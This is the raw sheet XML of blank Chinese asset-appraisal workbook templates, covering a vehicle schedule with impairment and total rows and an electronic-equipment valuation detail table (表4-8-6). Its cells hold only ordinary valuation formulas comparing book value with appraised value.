        <f>IF(L14=0,"",ROUND(Q14/L14*100,2))</f>
        <v/>
      </c>
      <c r="S14" s="223" t="n"/>
    </row>
    <row r="15" ht="17.25" customFormat="1" customHeight="1" s="215">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="271" t="n"/>
      <c r="C15" s="271" t="n"/>
      <c r="D15" s="271" t="n"/>
      <c r="E15" s="271" t="n"/>
      <c r="F15" s="271" t="n"/>
      <c r="G15" s="271" t="n"/>
      <c r="H15" s="609" t="n"/>
      <c r="I15" s="609" t="n"/>
      <c r="J15" s="610" t="n"/>
      <c r="K15" s="611" t="n"/>
      <c r="L15" s="611" t="n"/>
      <c r="M15" s="610" t="n"/>
      <c r="N15" s="380" t="n"/>
      <c r="O15" s="555">
        <f>ROUND(M15*N15/100,-2)</f>
        <v/>
      </c>
      <c r="P15" s="555">
        <f>M15-K15</f>
        <v/>
      </c>
      <c r="Q15" s="555">
        <f>O15-L15</f>
        <v/>
      </c>
      <c r="R15" s="555">
        <f>IF(L15=0,"",ROUND(Q15/L15*100,2))</f>
        <v/>
      </c>
      <c r="S15" s="223" t="n"/>
    </row>
    <row r="16" ht="17.25" customFormat="1" customHeight="1" s="215">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="271" t="n"/>
      <c r="C16" s="271" t="n"/>
      <c r="D16" s="271" t="n"/>
      <c r="E16" s="271" t="n"/>
      <c r="F16" s="271" t="n"/>
      <c r="G16" s="271" t="n"/>
      <c r="H16" s="609" t="n"/>
      <c r="I16" s="609" t="n"/>
      <c r="J16" s="610" t="n"/>
      <c r="K16" s="611" t="n"/>
      <c r="L16" s="611" t="n"/>
      <c r="M16" s="610" t="n"/>
      <c r="N16" s="380" t="n"/>
      <c r="O16" s="555">
        <f>ROUND(M16*N16/100,-2)</f>
        <v/>
      </c>
      <c r="P16" s="555">
        <f>M16-K16</f>
        <v/>
      </c>
      <c r="Q16" s="555">
        <f>O16-L16</f>
        <v/>
      </c>
      <c r="R16" s="555">
        <f>IF(L16=0,"",ROUND(Q16/L16*100,2))</f>
        <v/>
      </c>
      <c r="S16" s="223" t="n"/>
    </row>
    <row r="17" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="380" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="381" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="587" t="n"/>
      <c r="I17" s="587" t="n"/>
      <c r="J17" s="610" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="555" t="n"/>
      <c r="N17" s="380" t="n"/>
      <c r="O17" s="555">
        <f>ROUND(M17*N17/100,-2)</f>
        <v/>
      </c>
      <c r="P17" s="555">
        <f>M17-K17</f>
        <v/>
      </c>
      <c r="Q17" s="555">
        <f>O17-L17</f>
        <v/>
      </c>
      <c r="R17" s="555">
        <f>IF(L17=0,"",ROUND(Q17/L17*100,2))</f>
        <v/>
      </c>
      <c r="S17" s="227" t="n"/>
    </row>
    <row r="18" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="380" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="381" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="587" t="n"/>
      <c r="I18" s="587" t="n"/>
      <c r="J18" s="610" t="n"/>
      <c r="K18" s="611" t="n"/>
      <c r="L18" s="611" t="n"/>
      <c r="M18" s="610" t="n"/>
      <c r="N18" s="380" t="n"/>
      <c r="O18" s="555">
        <f>ROUND(M18*N18/100,-2)</f>
        <v/>
      </c>
      <c r="P18" s="555">
        <f>M18-K18</f>
        <v/>
      </c>
      <c r="Q18" s="555">
        <f>O18-L18</f>
        <v/>
      </c>
      <c r="R18" s="555">
        <f>IF(L18=0,"",ROUND(Q18/L18*100,2))</f>
        <v/>
      </c>
      <c r="S18" s="227" t="n"/>
    </row>
    <row r="19" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="380" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="381" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="587" t="n"/>
      <c r="I19" s="587" t="n"/>
      <c r="J19" s="610" t="n"/>
      <c r="K19" s="611" t="n"/>
      <c r="L19" s="611" t="n"/>
      <c r="M19" s="610" t="n"/>
      <c r="N19" s="228" t="n"/>
      <c r="O19" s="555">
        <f>ROUND(M19*N19/100,-2)</f>
        <v/>
      </c>
      <c r="P19" s="555">
        <f>M19-K19</f>
        <v/>
      </c>
      <c r="Q19" s="555">
        <f>O19-L19</f>
        <v/>
      </c>
      <c r="R19" s="555">
        <f>IF(L19=0,"",ROUND(Q19/L19*100,2))</f>
        <v/>
      </c>
      <c r="S19" s="227" t="n"/>
    </row>
    <row r="20" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="380" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="381" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="587" t="n"/>
      <c r="I20" s="587" t="n"/>
      <c r="J20" s="610" t="n"/>
      <c r="K20" s="611" t="n"/>
      <c r="L20" s="611" t="n"/>
      <c r="M20" s="610" t="n"/>
      <c r="N20" s="228" t="n"/>
      <c r="O20" s="555">
        <f>ROUND(M20*N20/100,-2)</f>
        <v/>
      </c>
      <c r="P20" s="555">
        <f>M20-K20</f>
        <v/>
      </c>
      <c r="Q20" s="555">
        <f>O20-L20</f>
        <v/>
      </c>
      <c r="R20" s="555">
        <f>IF(L20=0,"",ROUND(Q20/L20*100,2))</f>
        <v/>
      </c>
      <c r="S20" s="227" t="n"/>
    </row>
    <row r="21" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="380" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="381" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="587" t="n"/>
      <c r="I21" s="587" t="n"/>
      <c r="J21" s="610" t="n"/>
      <c r="K21" s="611" t="n"/>
      <c r="L21" s="611" t="n"/>
      <c r="M21" s="610" t="n"/>
      <c r="N21" s="228" t="n"/>
      <c r="O21" s="555">
        <f>ROUND(M21*N21/100,-2)</f>
        <v/>
      </c>
      <c r="P21" s="555">
        <f>M21-K21</f>
        <v/>
      </c>
      <c r="Q21" s="555">
        <f>O21-L21</f>
        <v/>
      </c>
      <c r="R21" s="555">
        <f>IF(L21=0,"",ROUND(Q21/L21*100,2))</f>
        <v/>
      </c>
      <c r="S21" s="227" t="n"/>
    </row>
    <row r="22" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="380" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="381" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="587" t="n"/>
      <c r="I22" s="587" t="n"/>
      <c r="J22" s="610" t="n"/>
      <c r="K22" s="611" t="n"/>
      <c r="L22" s="611" t="n"/>
      <c r="M22" s="610" t="n"/>
      <c r="N22" s="228" t="n"/>
      <c r="O22" s="555">
        <f>ROUND(M22*N22/100,-2)</f>
        <v/>
      </c>
      <c r="P22" s="555">
        <f>M22-K22</f>
        <v/>
      </c>
      <c r="Q22" s="555">
        <f>O22-L22</f>
        <v/>
      </c>
      <c r="R22" s="555">
        <f>IF(L22=0,"",ROUND(Q22/L22*100,2))</f>
        <v/>
      </c>
      <c r="S22" s="227" t="n"/>
    </row>
    <row r="23" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="380" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="381" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="587" t="n"/>
      <c r="I23" s="587" t="n"/>
      <c r="J23" s="610" t="n"/>
      <c r="K23" s="611" t="n"/>
      <c r="L23" s="611" t="n"/>
      <c r="M23" s="610" t="n"/>
      <c r="N23" s="228" t="n"/>
      <c r="O23" s="555">
        <f>ROUND(M23*N23/100,-2)</f>
        <v/>
      </c>
      <c r="P23" s="555">
        <f>M23-K23</f>
        <v/>
      </c>
      <c r="Q23" s="555">
        <f>O23-L23</f>
        <v/>
      </c>
      <c r="R23" s="555">
        <f>IF(L23=0,"",ROUND(Q23/L23*100,2))</f>
        <v/>
      </c>
      <c r="S23" s="227" t="n"/>
    </row>
    <row r="24" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="380" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="381" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="587" t="n"/>
      <c r="I24" s="587" t="n"/>
      <c r="J24" s="610" t="n"/>
      <c r="K24" s="611" t="n"/>
      <c r="L24" s="611" t="n"/>
      <c r="M24" s="610" t="n"/>
      <c r="N24" s="228" t="n"/>
      <c r="O24" s="555">
        <f>ROUND(M24*N24/100,-2)</f>
        <v/>
      </c>
      <c r="P24" s="555">
        <f>M24-K24</f>
        <v/>
      </c>
      <c r="Q24" s="555">
        <f>O24-L24</f>
        <v/>
      </c>
      <c r="R24" s="555">
        <f>IF(L24=0,"",ROUND(Q24/L24*100,2))</f>
        <v/>
      </c>
      <c r="S24" s="227" t="n"/>
    </row>
    <row r="25" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="380" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="381" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="587" t="n"/>
      <c r="I25" s="587" t="n"/>
      <c r="J25" s="610" t="n"/>
      <c r="K25" s="611" t="n"/>
      <c r="L25" s="611" t="n"/>
      <c r="M25" s="610" t="n"/>
      <c r="N25" s="228" t="n"/>
      <c r="O25" s="555">
        <f>ROUND(M25*N25/100,-2)</f>
        <v/>
      </c>
      <c r="P25" s="555">
        <f>M25-K25</f>
        <v/>
      </c>
      <c r="Q25" s="555">
        <f>O25-L25</f>
        <v/>
      </c>
      <c r="R25" s="555">
        <f>IF(L25=0,"",ROUND(Q25/L25*100,2))</f>
        <v/>
      </c>
      <c r="S25" s="227" t="n"/>
    </row>
    <row r="26" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="380" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="381" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="587" t="n"/>
      <c r="I26" s="587" t="n"/>
      <c r="J26" s="610" t="n"/>
      <c r="K26" s="611" t="n"/>
      <c r="L26" s="611" t="n"/>
      <c r="M26" s="610" t="n"/>
      <c r="N26" s="228" t="n"/>
      <c r="O26" s="555">
        <f>ROUND(M26*N26/100,-2)</f>
        <v/>
      </c>
      <c r="P26" s="555">
        <f>M26-K26</f>
        <v/>
      </c>
      <c r="Q26" s="555">
        <f>O26-L26</f>
        <v/>
      </c>
      <c r="R26" s="555">
        <f>IF(L26=0,"",ROUND(Q26/L26*100,2))</f>
        <v/>
      </c>
      <c r="S26" s="227" t="n"/>
    </row>
    <row r="27" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="380" t="n"/>
      <c r="D27" s="381" t="n"/>
      <c r="E27" s="381" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="587" t="n"/>
      <c r="I27" s="587" t="n"/>
      <c r="J27" s="610" t="n"/>
      <c r="K27" s="611" t="n"/>
      <c r="L27" s="611" t="n"/>
      <c r="M27" s="610" t="n"/>
      <c r="N27" s="228" t="n"/>
      <c r="O27" s="555">
        <f>ROUND(M27*N27/100,-2)</f>
        <v/>
      </c>
      <c r="P27" s="555">
        <f>M27-K27</f>
        <v/>
      </c>
      <c r="Q27" s="555">
        <f>O27-L27</f>
        <v/>
      </c>
      <c r="R27" s="555">
        <f>IF(L27=0,"",ROUND(Q27/L27*100,2))</f>
        <v/>
      </c>
      <c r="S27" s="227" t="n"/>
    </row>
    <row r="28" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="380" t="n"/>
      <c r="D28" s="381" t="n"/>
      <c r="E28" s="381" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="587" t="n"/>
      <c r="I28" s="587" t="n"/>
      <c r="J28" s="610" t="n"/>
      <c r="K28" s="611" t="n"/>
      <c r="L28" s="611" t="n"/>
      <c r="M28" s="610" t="n"/>
      <c r="N28" s="228" t="n"/>
      <c r="O28" s="555">
        <f>ROUND(M28*N28/100,-2)</f>
        <v/>
      </c>
      <c r="P28" s="555">
        <f>M28-K28</f>
        <v/>
      </c>
      <c r="Q28" s="555">
        <f>O28-L28</f>
        <v/>
      </c>
      <c r="R28" s="555">
        <f>IF(L28=0,"",ROUND(Q28/L28*100,2))</f>
        <v/>
      </c>
      <c r="S28" s="227" t="n"/>
    </row>
    <row r="29" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="380" t="n"/>
      <c r="D29" s="381" t="n"/>
      <c r="E29" s="381" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="380" t="n"/>
      <c r="H29" s="587" t="n"/>
      <c r="I29" s="587" t="n"/>
      <c r="J29" s="610" t="n"/>
      <c r="K29" s="611" t="n"/>
      <c r="L29" s="611" t="n"/>
      <c r="M29" s="610" t="n"/>
      <c r="N29" s="228" t="n"/>
      <c r="O29" s="555">
        <f>ROUND(M29*N29/100,-2)</f>
        <v/>
      </c>
      <c r="P29" s="555">
        <f>M29-K29</f>
        <v/>
      </c>
      <c r="Q29" s="555">
        <f>O29-L29</f>
        <v/>
      </c>
      <c r="R29" s="555">
        <f>IF(L29=0,"",ROUND(Q29/L29*100,2))</f>
        <v/>
      </c>
      <c r="S29" s="227" t="n"/>
    </row>
    <row r="30" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A30" s="116" t="n"/>
      <c r="B30" s="380" t="n"/>
      <c r="C30" s="380" t="n"/>
      <c r="D30" s="381" t="n"/>
      <c r="E30" s="381" t="n"/>
      <c r="F30" s="380" t="n"/>
      <c r="G30" s="380" t="n"/>
      <c r="H30" s="587" t="n"/>
      <c r="I30" s="587" t="n"/>
      <c r="J30" s="610" t="n"/>
      <c r="K30" s="611" t="n"/>
      <c r="L30" s="611" t="n"/>
      <c r="M30" s="610" t="n"/>
      <c r="N30" s="228" t="n"/>
      <c r="O30" s="555">
        <f>ROUND(M30*N30/100,-2)</f>
        <v/>
      </c>
      <c r="P30" s="555">
        <f>M30-K30</f>
        <v/>
      </c>
      <c r="Q30" s="555">
        <f>O30-L30</f>
        <v/>
      </c>
      <c r="R30" s="555">
        <f>IF(L30=0,"",ROUND(Q30/L30*100,2))</f>
        <v/>
      </c>
      <c r="S30" s="227" t="n"/>
    </row>
    <row r="31" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A31" s="116" t="n"/>
      <c r="B31" s="380" t="n"/>
      <c r="C31" s="380" t="n"/>
      <c r="D31" s="381" t="n"/>
      <c r="E31" s="381" t="n"/>
      <c r="F31" s="380" t="n"/>
      <c r="G31" s="380" t="n"/>
      <c r="H31" s="587" t="n"/>
      <c r="I31" s="587" t="n"/>
      <c r="J31" s="610" t="n"/>
      <c r="K31" s="555" t="n"/>
      <c r="L31" s="555" t="n"/>
      <c r="M31" s="555" t="n"/>
      <c r="N31" s="380" t="n"/>
      <c r="O31" s="555">
        <f>ROUND(M31*N31/100,-2)</f>
        <v/>
      </c>
      <c r="P31" s="555">
        <f>M31-K31</f>
        <v/>
      </c>
      <c r="Q31" s="555">
        <f>O31-L31</f>
        <v/>
      </c>
      <c r="R31" s="555">
        <f>IF(L31=0,"",ROUND(Q31/L31*100,2))</f>
        <v/>
      </c>
      <c r="S31" s="227" t="n"/>
    </row>
    <row r="32" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A32" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B32" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C32" s="593" t="n"/>
      <c r="D32" s="567" t="n"/>
      <c r="E32" s="380" t="n"/>
      <c r="F32" s="115" t="n"/>
      <c r="G32" s="608">
        <f>SUM(G7:G31)</f>
        <v/>
      </c>
      <c r="H32" s="233" t="n"/>
      <c r="I32" s="565" t="inlineStr"/>
      <c r="J32" s="612" t="n"/>
      <c r="K32" s="580">
        <f>SUM(K7:K31)</f>
        <v/>
      </c>
      <c r="L32" s="580">
        <f>SUM(L7:L31)</f>
        <v/>
      </c>
      <c r="M32" s="580">
        <f>SUM(M7:M31)</f>
        <v/>
      </c>
      <c r="N32" s="380" t="n"/>
      <c r="O32" s="580">
        <f>SUM(O7:O31)</f>
        <v/>
      </c>
      <c r="P32" s="555">
        <f>M32-K32</f>
        <v/>
      </c>
      <c r="Q32" s="555">
        <f>O32-L32</f>
        <v/>
      </c>
      <c r="R32" s="555">
        <f>IF(L32=0,"",ROUND(Q32/L32*100,2))</f>
        <v/>
      </c>
      <c r="S32" s="231" t="n"/>
    </row>
    <row r="33" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A33" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B33" s="284" t="inlineStr">
        <is>
          <t>减：车辆减值准备</t>
        </is>
      </c>
      <c r="C33" s="593" t="n"/>
      <c r="D33" s="567" t="n"/>
      <c r="E33" s="565" t="n"/>
      <c r="F33" s="565" t="n"/>
      <c r="G33" s="565" t="n"/>
      <c r="H33" s="565" t="n"/>
      <c r="I33" s="565" t="n"/>
      <c r="J33" s="612" t="n"/>
      <c r="K33" s="555" t="n"/>
      <c r="L33" s="555" t="n"/>
      <c r="M33" s="555" t="n"/>
      <c r="N33" s="380" t="n"/>
      <c r="O33" s="580" t="n"/>
      <c r="P33" s="555">
        <f>M33-K33</f>
        <v/>
      </c>
      <c r="Q33" s="555">
        <f>O33-L33</f>
        <v/>
      </c>
      <c r="R33" s="555">
        <f>IF(L33=0,"",ROUND(Q33/L33*100,2))</f>
        <v/>
      </c>
      <c r="S33" s="227" t="n"/>
    </row>
    <row r="34" ht="17.25" customFormat="1" customHeight="1" s="148">
      <c r="A34" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B34" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C34" s="593" t="n"/>
      <c r="D34" s="567" t="n"/>
      <c r="E34" s="380" t="n"/>
      <c r="F34" s="115" t="n"/>
      <c r="G34" s="608">
        <f>G32-G33</f>
        <v/>
      </c>
      <c r="H34" s="383" t="n"/>
      <c r="I34" s="565" t="n"/>
      <c r="J34" s="612" t="n"/>
      <c r="K34" s="580">
        <f>K32-K33</f>
        <v/>
      </c>
      <c r="L34" s="580">
        <f>L32-L33</f>
        <v/>
      </c>
      <c r="M34" s="580">
        <f>M32-M33</f>
        <v/>
      </c>
      <c r="N34" s="380" t="n"/>
      <c r="O34" s="580">
        <f>O32-O33</f>
        <v/>
      </c>
      <c r="P34" s="555">
        <f>M34-K34</f>
        <v/>
      </c>
      <c r="Q34" s="555">
        <f>O34-L34</f>
        <v/>
      </c>
      <c r="R34" s="555">
        <f>IF(L34=0,"",ROUND(Q34/L34*100,2))</f>
        <v/>
      </c>
      <c r="S34" s="231" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="20">
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="B2:S2"/>
    <mergeCell ref="K5:L5"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="B1:S1"/>
    <mergeCell ref="B34:D34"/>
    <mergeCell ref="I5:I6"/>
    <mergeCell ref="B33:D33"/>
    <mergeCell ref="G5:G6"/>
    <mergeCell ref="S5:S6"/>
    <mergeCell ref="B32:D32"/>
    <mergeCell ref="B4:J4"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="H5:H6"/>
    <mergeCell ref="R5:R6"/>
    <mergeCell ref="J5:J6"/>
    <mergeCell ref="M5:O5"/>
    <mergeCell ref="P5:Q5"/>
    <mergeCell ref="C5:C6"/>
  </mergeCells>
  <conditionalFormatting sqref="B32:S32">
    <cfRule type="expression" priority="4" dxfId="3">
      <formula>_xlfn.ISFORMULA(B32)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="B34:S34">
    <cfRule type="expression" priority="3" dxfId="3">
      <formula>_xlfn.ISFORMULA(B34)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="B5:S17">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(B5)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="B18:S31 B33:S33">
    <cfRule type="expression" priority="6" dxfId="3">
      <formula>_xlfn.ISFORMULA(B18)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="K31:M31 K33:M33">
    <cfRule type="expression" priority="5" dxfId="1">
      <formula>_xlfn.ISFORMULA(K31)</formula>
    </cfRule>
  </conditionalFormatting>
  <dataValidations count="1">
    <dataValidation sqref="N19:N30" showDropDown="0" showInputMessage="0" showErrorMessage="1" allowBlank="1" promptTitle="数据格式" prompt="居中，数值为0-100"/>
  </dataValidations>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.590551181102362" right="0.590551181102362" top="0.866141732283464" bottom="0.972222222222222" header="0.47244094488189" footer="0.590277777777778"/>
  <pageSetup orientation="landscape" paperSize="9" scale="62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 codeName="Sheet61">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:S34"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" topLeftCell="A5" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="W29" sqref="W29"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="9.33333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="8.83333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.5" customWidth="1" style="410" min="4" max="4"/>
    <col width="8.66666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="10.3333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col width="5.16666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="5.66666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="9.16666666666667" customWidth="1" style="410" min="9" max="10"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="11" max="12"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col outlineLevel="1" width="7.66666666666667" customWidth="1" style="410" min="14" max="14"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="15" max="15"/>
    <col outlineLevel="1" width="10.6666666666667" customWidth="1" style="410" min="16" max="17"/>
    <col outlineLevel="1" width="7.16666666666667" customWidth="1" style="410" min="18" max="18"/>
    <col width="6" customWidth="1" style="410" min="19" max="19"/>
    <col width="9" customWidth="1" style="410" min="2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固定资产—电子设备评估明细表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373" t="n"/>
      <c r="N3" s="373" t="n"/>
      <c r="O3" s="373" t="n"/>
      <c r="P3" s="373" t="n"/>
      <c r="Q3" s="204" t="n"/>
      <c r="R3" s="204" t="n"/>
      <c r="S3" s="606" t="inlineStr">
        <is>
          <t>表4-8-6</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="41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54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376" t="n"/>
      <c r="P4" s="376" t="n"/>
      <c r="S4" s="206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设备
编号</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>设备名称</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>规格型号</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>生产厂家</t>
        </is>
      </c>
      <c r="G5" s="271" t="inlineStr">
        <is>
          <t>计量单位</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>购置日期</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>启用日期</t>
        </is>
      </c>
      <c r="K5" s="188" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="L5" s="567" t="n"/>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="N5" s="593" t="n"/>
      <c r="O5" s="567" t="n"/>
      <c r="P5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="Q5" s="567" t="n"/>
      <c r="R5" s="209" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="S5" s="209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307" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="L6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="M6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="N6" s="380" t="inlineStr">
        <is>
          <t>成新率%</t>
        </is>
      </c>
      <c r="O6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="P6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="Q6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="R6" s="594" t="n"/>
      <c r="S6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="380" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="381" t="n"/>
      <c r="F7" s="180" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="380" t="n"/>
      <c r="I7" s="587" t="n"/>
      <c r="J7" s="587" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="555" t="n"/>
      <c r="N7" s="380" t="n"/>
      <c r="O7" s="555">
        <f>ROUND(M7*N7/100,-2)</f>
        <v/>
      </c>
      <c r="P7" s="555">
        <f>M7-K7</f>
        <v/>
      </c>
      <c r="Q7" s="555">
        <f>O7-L7</f>
        <v/>
      </c>
      <c r="R7" s="555">
        <f>IF(L7=0,"",ROUND(Q7/L7*100,2))</f>
        <v/>
      </c>
      <c r="S7" s="211" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="380" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="381" t="n"/>
      <c r="F8" s="381" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="380" t="n"/>
      <c r="I8" s="587" t="n"/>
      <c r="J8" s="587" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555" t="n"/>
      <c r="N8" s="380" t="n"/>
      <c r="O8" s="555">
        <f>ROUND(M8*N8/100,-2)</f>
        <v/>
      </c>
      <c r="P8" s="555">
        <f>M8-K8</f>
        <v/>
      </c>
      <c r="Q8" s="555">
        <f>O8-L8</f>
        <v/>
      </c>
      <c r="R8" s="555">
        <f>IF(L8=0,"",ROUND(Q8/L8*100,2))</f>
        <v/>
      </c>
      <c r="S8" s="211" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="380" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="381" t="n"/>
      <c r="F9" s="381" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="380" t="n"/>
      <c r="I9" s="587" t="n"/>
      <c r="J9" s="587" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="555" t="n"/>
      <c r="N9" s="380" t="n"/>
      <c r="O9" s="555">
        <f>ROUND(M9*N9/100,-2)</f>
        <v/>
      </c>
      <c r="P9" s="555">
        <f>M9-K9</f>
